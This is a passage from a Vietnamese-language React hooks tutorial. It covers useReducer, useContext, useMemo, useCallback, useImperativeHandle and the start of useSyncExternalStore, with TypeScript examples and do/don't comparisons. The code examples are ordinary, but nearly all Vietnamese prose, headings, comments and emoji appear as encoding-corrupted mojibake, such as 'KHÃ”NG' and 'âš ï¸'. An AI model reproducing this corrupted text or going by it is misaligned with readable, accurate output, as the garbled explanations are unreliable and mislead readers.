    // Set initial position BEFORE paint
    if (boxRef.current) {
      boxRef.current.style.transform = 'translateX(-100px)';
      boxRef.current.style.opacity = '0';
    }
    
    // Then animate (browser batches with paint)
    requestAnimationFrame(() => {
      if (boxRef.current) {
        boxRef.current.style.transition = 'all 0.3s';
        boxRef.current.style.transform = 'translateX(0)';
        boxRef.current.style.opacity = '1';
      }
    });
  }, []);
  
  return <div ref={boxRef}>Animated Box</div>;
}
```

**âš ï¸ Khi nÃ o KHÃ”NG nÃªn dÃ¹ng useLayoutEffect:**

```typescript
// âŒ Data fetching (khÃ´ng cáº§n sync)
useLayoutEffect(() => {
  fetch('/api').then(setData); // Block UI unnecessarily!
}, []);

// âœ… DÃ¹ng useEffect thay vÃ¬
useEffect(() => {
  fetch('/api').then(setData);
}, []);

// âŒ Subscriptions (khÃ´ng cáº§n sync)
useLayoutEffect(() => {
  const sub = eventEmitter.on('event', handler);
  return () => sub.off();
}, []);

// âœ… DÃ¹ng useEffect
useEffect(() => {
  const sub = eventEmitter.on('event', handler);
  return () => sub.off();
}, []);

// Rule of thumb:
// - useEffect: 99% cases (default choice)
// - useLayoutEffect: Chá»‰ khi cÃ³ visual bugs (flicker, jump, wrong position)
```

---

##### **1.5. useReducer - Complex State Management Hook**

**ğŸ¯ Má»¥c Ä‘Ã­ch:**
Quáº£n lÃ½ state phá»©c táº¡p vá»›i logic xá»­ lÃ½ táº­p trung (giá»‘ng Redux pattern).

**ğŸ“– Khi nÃ o dÃ¹ng useReducer thay vÃ¬ useState:**
- State cÃ³ nhiá»u sub-values liÃªn quan
- State update logic phá»©c táº¡p (nhiá»u actions)
- Next state phá»¥ thuá»™c vÃ o previous state
- Muá»‘n centralize state logic (dá»… test)

**ğŸ’¡ Chi tiáº¿t ká»¹ thuáº­t:**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// BASIC PATTERN
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

type State = { count: number };
type Action = 
  | { type: 'increment' }
  | { type: 'decrement' }
  | { type: 'reset' }
  | { type: 'set'; payload: number };

function reducer(state: State, action: Action): State {
  switch (action.type) {
    case 'increment':
      return { count: state.count + 1 };
    case 'decrement':
      return { count: state.count - 1 };
    case 'reset':
      return { count: 0 };
    case 'set':
      return { count: action.payload };
    default:
      return state;
  }
}

function Counter() {
  const [state, dispatch] = useReducer(reducer, { count: 0 });
  
  return (
    <div>
      <p>Count: {state.count}</p>
      <button onClick={() => dispatch({ type: 'increment' })}>+</button>
      <button onClick={() => dispatch({ type: 'decrement' })}>-</button>
      <button onClick={() => dispatch({ type: 'reset' })}>Reset</button>
    </div>
  );
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// REAL-WORLD: TODO APP
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

type Todo = { id: number; text: string; done: boolean };
type TodoState = { todos: Todo[]; filter: 'all' | 'active' | 'completed' };
type TodoAction =
  | { type: 'ADD_TODO'; text: string }
  | { type: 'TOGGLE_TODO'; id: number }
  | { type: 'DELETE_TODO'; id: number }
  | { type: 'SET_FILTER'; filter: 'all' | 'active' | 'completed' }
  | { type: 'CLEAR_COMPLETED' };

function todoReducer(state: TodoState, action: TodoAction): TodoState {
  switch (action.type) {
    case 'ADD_TODO':
      return {
        ...state,
        todos: [...state.todos, { 
          id: Date.now(), 
          text: action.text, 
          done: false 
        }]
      };
      
    case 'TOGGLE_TODO':
      return {
        ...state,
        todos: state.todos.map(todo =>
          todo.id === action.id ? { ...todo, done: !todo.done } : todo
        )
      };
      
    case 'DELETE_TODO':
      return {
        ...state,
        todos: state.todos.filter(todo => todo.id !== action.id)
      };
      
    case 'SET_FILTER':
      return { ...state, filter: action.filter };
      
    case 'CLEAR_COMPLETED':
      return {
        ...state,
        todos: state.todos.filter(todo => !todo.done)
      };
      
    default:
      return state;
  }
}

function TodoApp() {
  const [state, dispatch] = useReducer(todoReducer, {
    todos: [],
    filter: 'all'
  });
  
  const visibleTodos = state.todos.filter(todo => {
    if (state.filter === 'active') return !todo.done;
    if (state.filter === 'completed') return todo.done;
    return true;
  });
  
  return (
    <div>
      <input 
        type="text"
        onKeyPress={(e) => {
          if (e.key === 'Enter') {
            dispatch({ type: 'ADD_TODO', text: e.currentTarget.value });
            e.currentTarget.value = '';
          }
        }}
      />
      
      <ul>
        {visibleTodos.map(todo => (
          <li key={todo.id}>
            <input
              type="checkbox"
              checked={todo.done}
              onChange={() => dispatch({ type: 'TOGGLE_TODO', id: todo.id })}
            />
            {todo.text}
            <button onClick={() => dispatch({ type: 'DELETE_TODO', id: todo.id })}>
              Delete
            </button>
          </li>
        ))}
      </ul>
      
      <div>
        <button onClick={() => dispatch({ type: 'SET_FILTER', filter: 'all' })}>
          All
        </button>
        <button onClick={() => dispatch({ type: 'SET_FILTER', filter: 'active' })}>
          Active
        </button>
        <button onClick={() => dispatch({ type: 'SET_FILTER', filter: 'completed' })}>
          Completed
        </button>
        <button onClick={() => dispatch({ type: 'CLEAR_COMPLETED' })}>
          Clear Completed
        </button>
      </div>
    </div>
  );
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// LAZY INITIALIZATION
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function init(initialCount: number): State {
  // Expensive computation
  return { count: initialCount * 2 };
}

function Counter() {
  // Init function chá»‰ cháº¡y 1 láº§n
  const [state, dispatch] = useReducer(reducer, 10, init);
  // state.count = 20 (10 * 2)
}
```

**âš ï¸ useReducer vs useState:**

```typescript
// useState: Simple state
const [count, setCount] = useState(0);
const [name, setName] = useState('');
const [email, setEmail] = useState('');

// useReducer: Complex related state
type FormState = { name: string; email: string; errors: string[] };
const [state, dispatch] = useReducer(formReducer, initialState);

// Rule:
// - 1-3 related values â†’ useState
// - 4+ related values OR complex logic â†’ useReducer
```

---

##### **1.6. useContext - Consume Context Values**

**ğŸ¯ Má»¥c Ä‘Ã­ch:** Share data across component tree mÃ  khÃ´ng cáº§n pass props (theme, auth, language).

**ğŸ“– CÃ¡ch hoáº¡t Ä‘á»™ng:**

```typescript
// Context flow:
// 1. createContext() â†’ Táº¡o Context object
// 2. <Provider value={...}> â†’ Cung cáº¥p value
// 3. useContext(Context) â†’ Subscribe vÃ  nháº­n value
// 4. Khi value thay Ä‘á»•i â†’ All consumers re-render

// Performance note:
// - Context re-render Táº¤T Cáº¢ consumers khi value thay Ä‘á»•i
// - KhÃ´ng cÃ³ selector mechanism (khÃ¡c Redux)
// - Cáº§n optimize báº±ng React.memo hoáº·c useMemo
```

**ğŸ’¡ Chi tiáº¿t ká»¹ thuáº­t:**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// BASIC USAGE
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

type Theme = 'light' | 'dark';
const ThemeContext = createContext<Theme>('light');

function App() {
  const [theme, setTheme] = useState<Theme>('light');
  
  return (
    <ThemeContext.Provider value={theme}>
      <Toolbar />
      <button onClick={() => setTheme(theme === 'light' ? 'dark' : 'light')}>
        Toggle Theme
      </button>
    </ThemeContext.Provider>
  );
}

function Toolbar() {
  return <ThemedButton />;
}

function ThemedButton() {
  const theme = useContext(ThemeContext); // âœ… Clean syntax
  
  return (
    <button className={theme}>
      I am styled with {theme} theme
    </button>
  );
}

// Old way (before hooks):
function ThemedButtonOld() {
  return (
    <ThemeContext.Consumer>
      {theme => ( // âŒ Wrapper hell
        <button className={theme}>
          I am styled with {theme} theme
        </button>
      )}
    </ThemeContext.Consumer>
  );
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// MULTIPLE CONTEXTS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const ThemeContext = createContext('light');
const UserContext = createContext(null);
const LanguageContext = createContext('en');

function App() {
  const [theme, setTheme] = useState('light');
  const [user, setUser] = useState(null);
  const [lang, setLang] = useState('en');
  
  return (
    <ThemeContext.Provider value={theme}>
      <UserContext.Provider value={user}>
        <LanguageContext.Provider value={lang}>
          <Dashboard />
        </LanguageContext.Provider>
      </UserContext.Provider>
    </ThemeContext.Provider>
  );
}

function Dashboard() {
  const theme = useContext(ThemeContext);
  const user = useContext(UserContext);
  const lang = useContext(LanguageContext);
  
  return (
    <div className={theme}>
      Welcome {user?.name} ({lang})
    </div>
  );
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// CUSTOM HOOK PATTERN (Best practice)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

type AuthContextType = {
  user: User | null;
  login: (email: string, password: string) => Promise<void>;
  logout: () => void;
  loading: boolean;
};

const AuthContext = createContext<AuthContextType | undefined>(undefined);

// Custom hook vá»›i error checking
function useAuth() {
  const context = useContext(AuthContext);
  
  if (context === undefined) {
    throw new Error('useAuth must be used within AuthProvider');
  }
  
  return context;
}

// Provider component
function AuthProvider({ children }: { children: ReactNode }) {
  const [user, setUser] = useState<User | null>(null);
  const [loading, setLoading] = useState(false);
  
  const login = async (email: string, password: string) => {
    setLoading(true);
    try {
      const user = await authService.login(email, password);
      setUser(user);
    } finally {
      setLoading(false);
    }
  };
  
  const logout = () => {
    authService.logout();
    setUser(null);
  };
  
  const value = useMemo(
    () => ({ user, login, logout, loading }),
    [user, loading]
  );
  
  return <AuthContext.Provider value={value}>{children}</AuthContext.Provider>;
}

// Usage
function App() {
  return (
    <AuthProvider>
      <Dashboard />
    </AuthProvider>
  );
}

function Dashboard() {
  const { user, logout } = useAuth(); // âœ… Type-safe, error checking
  
  return (
    <div>
      <p>Welcome {user?.name}</p>
      <button onClick={logout}>Logout</button>
    </div>
  );
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// PERFORMANCE OPTIMIZATION
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// âŒ Problem: All consumers re-render khi Báº¤T Ká»² value nÃ o thay Ä‘á»•i
function AppBad() {
  const [user, setUser] = useState(null);
  const [theme, setTheme] = useState('light');
  
  // âŒ New object má»—i render â†’ all consumers re-render
  const value = { user, theme, setUser, setTheme };
  
  return (
    <AppContext.Provider value={value}>
      <Component1 /> {/* Re-render khi theme Ä‘á»•i dÃ¹ chá»‰ dÃ¹ng user */}
      <Component2 /> {/* Re-render khi user Ä‘á»•i dÃ¹ chá»‰ dÃ¹ng theme */}
    </AppContext.Provider>
  );
}

// âœ… Solution 1: Split contexts
function AppGood() {
  const [user, setUser] = useState(null);
  const [theme, setTheme] = useState('light');
  
  const userValue = useMemo(() => ({ user, setUser }), [user]);
  const themeValue = useMemo(() => ({ theme, setTheme }), [theme]);
  
  return (
    <UserContext.Provider value={userValue}>
      <ThemeContext.Provider value={themeValue}>
        <Component1 /> {/* Chá»‰ re-render khi user Ä‘á»•i */}
        <Component2 /> {/* Chá»‰ re-render khi theme Ä‘á»•i */}
      </ThemeContext.Provider>
    </UserContext.Provider>
  );
}

// âœ… Solution 2: React.memo cho consumers
const Component1 = React.memo(function Component1() {
  const { user } = useContext(UserContext);
  return <div>{user?.name}</div>;
});
```

---

##### **1.7. useMemo - Memoized Value Hook**

**ğŸ¯ Má»¥c Ä‘Ã­ch:**
Cache káº¿t quáº£ cá»§a expensive calculations, chá»‰ re-compute khi dependencies thay Ä‘á»•i.

**ğŸ“– Khi nÃ o dÃ¹ng useMemo:**
1. Expensive calculations (sorting, filtering large arrays)
2. Preventing re-creation of objects/arrays (pass to child components)
3. Optimizing child component re-renders

**ğŸ’¡ Chi tiáº¿t ká»¹ thuáº­t:**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// BASIC PATTERN
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function ProductList({ products, filter }) {
  // âŒ Without useMemo: Sort láº¡i Má»–I láº§n component re-render
  const sortedProducts = products.sort((a, b) => a.price - b.price);
  
  // âœ… With useMemo: Chá»‰ sort khi products hoáº·c filter thay Ä‘á»•i
  const sortedProducts = useMemo(() => {
    console.log('Sorting...'); // Chá»‰ log khi re-compute
    return products
      .filter(p => p.category === filter)
      .sort((a, b) => a.price - b.price);
  }, [products, filter]); // Dependencies
  
  return (
    <ul>
      {sortedProducts.map(p => <li key={p.id}>{p.name}</li>)}
    </ul>
  );
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// EXPENSIVE COMPUTATION
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function Fibonacci({ n }) {
  const result = useMemo(() => {
    function fib(num) {
      if (num <= 1) return num;
      return fib(num - 1) + fib(num - 2);
    }
    return fib(n);
  }, [n]);
  
  return <div>Fibonacci({n}) = {result}</div>;
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// PREVENT CHILD RE-RENDERS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function Parent() {
  const [count, setCount] = useState(0);
  const [name, setName] = useState('');
  
  // âŒ New object má»—i render â†’ Child re-render dÃ¹ props "giá»‘ng"
  const config = { theme: 'dark', lang: 'en' };
  
  // âœ… Stable reference â†’ Child chá»‰ re-render khi config thá»±c sá»± Ä‘á»•i
  const config = useMemo(() => ({
    theme: 'dark',
    lang: 'en'
  }), []); // No deps = never re-create
  
  return (
    <>
      <input value={name} onChange={e => setName(e.target.value)} />
      <Child config={config} /> {/* KhÃ´ng re-render khi name thay Ä‘á»•i */}
    </>
  );
}

const Child = React.memo(({ config }) => {
  console.log('Child rendered');
  return <div>{config.theme}</div>;
});

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// DERIVED STATE
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function TodoList({ todos }) {
  // Stats chá»‰ re-compute khi todos thay Ä‘á»•i
  const stats = useMemo(() => ({
    total: todos.length,
    completed: todos.filter(t => t.done).length,
    active: todos.filter(t => !t.done).length,
    completionRate: todos.length > 0 
      ? (todos.filter(t => t.done).length / todos.length * 100).toFixed(1)
      : '0'
  }), [todos]);
  
  return (
    <div>
      <p>Total: {stats.total}</p>
      <p>Completed: {stats.completed}</p>
      <p>Active: {stats.active}</p>
      <p>Completion: {stats.completionRate}%</p>
    </div>
  );
}
```

**âš ï¸ Khi KHÃ”NG nÃªn dÃ¹ng useMemo:**

```typescript
// âŒ 1. Cheap calculations
const doubled = useMemo(() => count * 2, [count]);
// âœ… Just compute directly
const doubled = count * 2;

// âŒ 2. Primitives (khÃ´ng cáº§n memoize)
const greeting = useMemo(() => 'Hello', []);
// âœ… Just use constant
const greeting = 'Hello';

// âŒ 3. Over-optimization (premature optimization)
const data = useMemo(() => transform(props.data), [props.data]);
// âœ… Profile first! Náº¿u khÃ´ng cÃ³ performance issue, Ä‘á»«ng dÃ¹ng

// Rule: Chá»‰ dÃ¹ng useMemo khi:
// - CÃ³ performance issue Ä‘o Ä‘Æ°á»£c (React DevTools Profiler)
// - Computation thá»±c sá»± expensive (>10ms)
// - Prevent child re-renders (vá»›i React.memo)
```

---

##### **1.8. useCallback - Memoized Function Hook**

**ğŸ¯ Má»¥c Ä‘Ã­ch:**
Cache function reference, trÃ¡nh re-create function má»—i render (optimization cho child components).

**ğŸ“– useCallback vs useMemo:**

```typescript
// useCallback: Memoize FUNCTION
const memoizedCallback = useCallback(() => {
  doSomething(a, b);
}, [a, b]);

// Equivalent to:
const memoizedCallback = useMemo(() => {
  return () => doSomething(a, b);
}, [a, b]);

// useMemo: Memoize RETURN VALUE
const memoizedValue = useMemo(() => computeExpensiveValue(a, b), [a, b]);
```

**ğŸ’¡ Chi tiáº¿t ká»¹ thuáº­t:**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// BASIC USAGE
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function Parent() {
  const [count, setCount] = useState(0);
  const [name, setName] = useState('');
  
  // âŒ New function má»—i render â†’ Child re-render
  const handleClick = () => {
    console.log('Clicked');
  };
  
  // âœ… Stable reference â†’ Child khÃ´ng re-render
  const handleClick = useCallback(() => {
    console.log('Clicked');
  }, []); // No deps = never re-create
  
  return (
    <>
      <input value={name} onChange={e => setName(e.target.value)} />
      <Child onClick={handleClick} /> {/* KhÃ´ng re-render khi name Ä‘á»•i */}
    </>
  );
}

const Child = React.memo(({ onClick }) => {
  console.log('Child rendered');
  return <button onClick={onClick}>Click</button>;
});

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// WITH DEPENDENCIES
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function SearchBox() {
  const [query, setQuery] = useState('');
  const [results, setResults] = useState([]);
  
  // Function re-create khi query thay Ä‘á»•i
  const handleSearch = useCallback(async () => {
    const data = await fetch(`/api/search?q=${query}`);
    setResults(await data.json());
  }, [query]); // Dependency: query
  
  // Debounced version
  const debouncedSearch = useCallback(
    debounce(handleSearch, 300),
    [handleSearch]
  );
  
  return (
    <div>
      <input 
        value={query} 
        onChange={e => setQuery(e.target.value)}
      />
      <button onClick={handleSearch}>Search</button>
    </div>
  );
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// EVENT HANDLERS WITH STATE
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function TodoItem({ todo, onToggle, onDelete }) {
  // âŒ Táº¡o function má»›i má»—i render (náº¿u khÃ´ng memo)
  const handleToggle = () => onToggle(todo.id);
  const handleDelete = () => onDelete(todo.id);
  
  // âœ… Stable references (náº¿u parent truyá»n memoized callbacks)
  const handleToggle = useCallback(() => {
    onToggle(todo.id);
  }, [todo.id, onToggle]);
  
  const handleDelete = useCallback(() => {
    onDelete(todo.id);
  }, [todo.id, onDelete]);
  
  return (
    <li>
      <input type="checkbox" onChange={handleToggle} />
      {todo.text}
      <button onClick={handleDelete}>Delete</button>
    </li>
  );
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// CUSTOM HOOKS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function useDebounce(callback, delay, deps) {
  const timeoutRef = useRef(null);
  
  return useCallback((...args) => {
    if (timeoutRef.current) {
      clearTimeout(timeoutRef.current);
    }
    
    timeoutRef.current = setTimeout(() => {
      callback(...args);
    }, delay);
  }, [callback, delay, ...deps]);
}

// Usage
function Search() {
  const [query, setQuery] = useState('');
  
  const search = useCallback((q) => {
    console.log('Searching for:', q);
  }, []);
  
  const debouncedSearch = useDebounce(search, 500, []);
  
  return (
    <input 
      value={query}
      onChange={e => {
        setQuery(e.target.value);
        debouncedSearch(e.target.value);
      }}
    />
  );
}
```

**âš ï¸ Common Mistakes:**

```typescript
// âŒ 1. useCallback without React.memo (vÃ´ Ã­ch)
function Parent() {
  const handleClick = useCallback(() => {}, []); // VÃ´ Ã­ch vÃ¬ Child khÃ´ng memo!
  return <Child onClick={handleClick} />;
}

function Child({ onClick }) { // âŒ KhÃ´ng memo â†’ váº«n re-render
  return <button onClick={onClick}>Click</button>;
}

// âœ… Fix: DÃ¹ng React.memo
const Child = React.memo(({ onClick }) => {
  return <button onClick={onClick}>Click</button>;
});

// âŒ 2. Missing dependencies
const handleClick = useCallback(() => {
  console.log(count); // âŒ count khÃ´ng cÃ³ trong deps â†’ stale
}, []);

// âœ… Fix: Include count
const handleClick = useCallback(() => {
  console.log(count);
}, [count]);

// âŒ 3. Over-optimization
const handleClick = useCallback(() => {
  setCount(c => c + 1);
}, []); // âŒ KhÃ´ng cáº§n thiáº¿t náº¿u khÃ´ng pass cho child

// âœ… Just use regular function
const handleClick = () => {
  setCount(c => c + 1);
};
```

---

##### **1.9. useImperativeHandle - Customize Ref Exposure**

**ğŸ¯ Má»¥c Ä‘Ã­ch:**
Customize giÃ¡ trá»‹ exposed qua ref tá»« child component (advanced pattern, Ã­t dÃ¹ng).

**ğŸ“– Khi nÃ o dÃ¹ng:**
- Expose specific methods tá»« child (thay vÃ¬ toÃ n bá»™ DOM node)
- Táº¡o reusable components vá»›i imperative API
- Integration vá»›i third-party libraries

**ğŸ’¡ Chi tiáº¿t ká»¹ thuáº­t:**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// BASIC PATTERN
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

type InputHandle = {
  focus: () => void;
  clear: () => void;
};

const CustomInput = forwardRef<InputHandle, { placeholder?: string }>(
  (props, ref) => {
    const inputRef = useRef<HTMLInputElement>(null);
    
    // Expose custom methods thay vÃ¬ DOM node
    useImperativeHandle(ref, () => ({
      focus: () => {
        inputRef.current?.focus();
      },
      clear: () => {
        if (inputRef.current) {
          inputRef.current.value = '';
        }
      }
    }), []); // Deps: re-create methods khi deps thay Ä‘á»•i
    
    return <input ref={inputRef} placeholder={props.placeholder} />;
  }
);

// Usage
function Parent() {
  const inputRef = useRef<InputHandle>(null);
  
  return (
    <>
      <CustomInput ref={inputRef} />
      <button onClick={() => inputRef.current?.focus()}>Focus</button>
      <button onClick={() => inputRef.current?.clear()}>Clear</button>
    </>
  );
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// FORM VALIDATION
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

type FormHandle = {
  submit: () => void;
  reset: () => void;
  validate: () => boolean;
  getValues: () => Record<string, any>;
};

const Form = forwardRef<FormHandle, { onSubmit: (data: any) => void }>(
  ({ onSubmit }, ref) => {
    const [values, setValues] = useState({});
    const [errors, setErrors] = useState({});
    
    const validate = useCallback(() => {
      // Validation logic
      const newErrors = {};
      if (!values.email) newErrors.email = 'Required';
      setErrors(newErrors);
      return Object.keys(newErrors).length === 0;
    }, [values]);
    
    useImperativeHandle(ref, () => ({
      submit: () => {
        if (validate()) {
          onSubmit(values);
        }
      },
      reset: () => {
        setValues({});
        setErrors({});
      },
      validate,
      getValues: () => values
    }), [values, validate, onSubmit]);
    
    return (
      <form>
        {/* Form fields */}
      </form>
    );
  }
);

// Usage
function Parent() {
  const formRef = useRef<FormHandle>(null);
  
  return (
    <>
      <Form ref={formRef} onSubmit={console.log} />
      <button onClick={() => formRef.current?.submit()}>Submit</button>
      <button onClick={() => formRef.current?.reset()}>Reset</button>
    </>
  );
}
```

**âš ï¸ Best Practices:**

```typescript
// âŒ Don't expose entire DOM node
useImperativeHandle(ref, () => inputRef.current);

// âœ… Expose specific methods
useImperativeHandle(ref, () => ({
  focus: () => inputRef.current?.focus()
}));

// âŒ Don't overuse (prefer props/callbacks)
// Imperative API should be last resort

// âœ… Use declarative approach when possible
<Input autoFocus onClear={handleClear} /> // Declarative
vs
inputRef.current.focus(); // Imperative
```

---

##### **1.10. useSyncExternalStore - Sync with External Store**

**ğŸ¯ Má»¥c Ä‘Ã­ch:**
Subscribe to external stores (Redux, Zustand, browser APIs) má»™t cÃ¡ch an toÃ n vá»›i React 18+ concurrent rendering.

**ğŸ“– Táº¡i sao cáº§n hook nÃ y:**
- React 18+ cÃ³ concurrent rendering â†’ cÃ³ thá»ƒ render nhiá»u láº§n trÆ°á»›c commit
- External stores (khÃ´ng pháº£i React state) cÃ³ thá»ƒ thay Ä‘á»•i giá»¯a cÃ¡c láº§n render
- useSyncExternalStore Ä‘áº£m báº£o consistency

**ğŸ’¡ Chi tiáº¿t ká»¹ thuáº­t:**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// BASIC PATTERN
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const store = {
  listeners: new Set(),
  state: { count: 0 },
  
  subscribe(listener) {
    this.listeners.add(listener);
    return () => this.listeners.delete(listener);
  },
  
  getSnapshot() {
    return this.state;
  },
  
  increment() {
    this.state = { count: this.state.count + 1 };
    this.listeners.forEach(listener => listener());
  }
};

function Counter() {
  const state = useSyncExternalStore(
